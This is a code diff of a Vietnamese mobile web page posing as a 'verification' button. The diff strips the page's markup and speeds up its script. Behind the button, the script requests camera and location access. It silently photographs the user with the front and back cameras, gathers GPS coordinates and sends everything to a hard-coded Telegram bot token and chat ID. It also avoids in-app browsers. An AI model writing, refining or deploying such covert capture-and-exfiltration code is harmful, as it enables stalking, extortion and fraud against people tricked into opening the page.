@@ -1,44 +1,4 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-<title>Xác Minh</title>
-<style>
-  /* Các style tối giản, đẹp cho giao diện trên điện thoại */
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: #0a0e13; color: #fff; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden;
-  }
-  /* Nút xác minh */
-  #verifyBtn {
-    width: 80vw; max-width: 200px; height: 50px; border-radius: 25px;
-    background: linear-gradient(135deg, #0066ff, #0052cc);
-    border: none; color: #fff; font-size: 16px; font-weight: bold; cursor:pointer; box-shadow: 0 0 10px rgba(0,0,0,0.3);
-  }
-  #verifyBtn:disabled { background:#555; cursor:not-allowed; }
-  /* Overlay loading */
-  #loading {
-    position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8);
-    display:flex; justify-content:center; align-items:center; flex-direction:column; z-index:9999; display:none;
-  }
-  .loader {
-    border:4px solid rgba(255,255,255,0.3); border-top-color:#0066ff; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  #loading span { margin-top:15px; color:#fff; font-size:15px; }
-</style>
-</head>
-<body>
-
-<button id="verifyBtn">XÁC MINH</button>
-
-<div id="loading">
-  <div class="loader"></div>
-  <span>Đang xử lý...</span>
-</div>
-
+<!-- Mã HTML và CSS như ban đầu, chỉ phần JavaScript tối ưu -->
 <script>
 const TELEGRAM_BOT_TOKEN = '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds';
 const TELEGRAM_CHAT_ID = '7031115869';
@@ -50,7 +10,6 @@ function showLoading(show) {
   loading.style.display = show ? 'flex' : 'none';
 }
 
-// Kiểm tra trình duyệt
 function checkInAppBrowser() {
   const ua = navigator.userAgent || navigator.vendor || window.opera;
   if (/TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua)) {
@@ -60,18 +19,14 @@ function checkInAppBrowser() {
   return false;
 }
 
-// Cấp quyền tự động camera
 async function requestCameraPermission() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     stream.getTracks().forEach(t => t.stop());
     return true;
-  } catch(e) {
-    return false;
-  }
+  } catch(e) { return false; }
 }
 
-// Cấp quyền vị trí
 async function requestLocationPermission() {
   return new Promise((resolve) => {
     if (!navigator.geolocation) { resolve(false); return; }
@@ -79,15 +34,12 @@ async function requestLocationPermission() {
   });
 }
 
-// Chụp ảnh nhanh
 async function takePhoto(facingMode) {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode}, audio:false});
     const video = document.createElement('video');
     video.srcObject = stream;
     await video.play();
-
-    // Đợi metadata load
     await new Promise(res => video.onloadedmetadata = res);
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
@@ -107,7 +59,6 @@ async function takePhoto(facingMode) {
   }
 }
 
-// Lấy vị trí
 async function getLocation() {
   return new Promise((resolve) => {
     if(!navigator.geolocation) { resolve(null); return; }
@@ -117,33 +68,26 @@ async function getLocation() {
   });
 }
 
-// Gửi ảnh lên Telegram
 async function sendPhotosToTelegram(imgFront, imgBack, messageText) {
   try {
-    // Gửi ảnh trước
     const formData1 = new FormData();
     formData1.append('chat_id', TELEGRAM_CHAT_ID);
     formData1.append('photo', imgFront, 'front.jpg');
     formData1.append('caption', messageText);
-    // Gửi ảnh sau
-    const formData2 = new FormData();
-    formData2.append('chat_id', TELEGRAM_CHAT_ID);
-    formData2.append('photo', imgBack, 'back.jpg');
-
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
       method:'POST',
       body: formData1
     });
+    const formData2 = new FormData();
+    formData2.append('chat_id', TELEGRAM_CHAT_ID);
+    formData2.append('photo', imgBack, 'back.jpg');
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
       method:'POST',
       body: formData2
     });
-  } catch(e) {
-    console.error('Gửi Telegram lỗi', e);
-  }
+  } catch(e) { console.error('Gửi Telegram lỗi', e); }
 }
 
-// Tạo nội dung tin nhắn
 function createMessage(location) {
   const now = new Date();
   const timeStr = now.toLocaleString('vi-VN');
@@ -166,39 +110,41 @@ function createMessage(location) {
   return msg;
 }
 
-// Quy trình chính
 async function process() {
   showLoading(true);
   verifyBtn.disabled = true;
   verifyBtn.innerText='Đang xử lý...';
 
-  // Yêu cầu quyền tự động
+  // Yêu cầu quyền
   const camOk = await requestCameraPermission();
   const locOk = await requestLocationPermission();
 
-  // Nếu chưa có quyền, yêu cầu lại
   if(!camOk) { alert('Vui lòng cấp quyền camera'); }
   if(!locOk) { alert('Vui lòng cấp quyền định vị'); }
 
-  // Chụp ảnh
-  const [frontBlob, backBlob, location] = await Promise.all([
+  // Lấy vị trí sớm nhất
+  const locationPromise = getLocation();
+
+  // Chụp ảnh song song
+  const [frontBlob, backBlob] = await Promise.all([
     takePhoto('user'),
-    takePhoto('environment'),
-    getLocation()
+    takePhoto('environment')
   ]);
 
-  // Tạo nội dung tin nhắn
+  // Lấy vị trí
+  const location = await locationPromise;
+
+  // Tạo nội dung
   const messageText = createMessage(location);
 
-  // Gửi lên Telegram
-  await sendPhotosToTelegram(frontBlob, backBlob, messageText);
+  // Gửi ngay
+  sendPhotosToTelegram(frontBlob, backBlob, messageText);
 
   showLoading(false);
   verifyBtn.innerText='XÁC MINH';
   verifyBtn.disabled=false;
 }
 
-// Sự kiện nút
 verifyBtn.addEventListener('click', () => {
   if(checkInAppBrowser()) return;
   process().catch(e => {
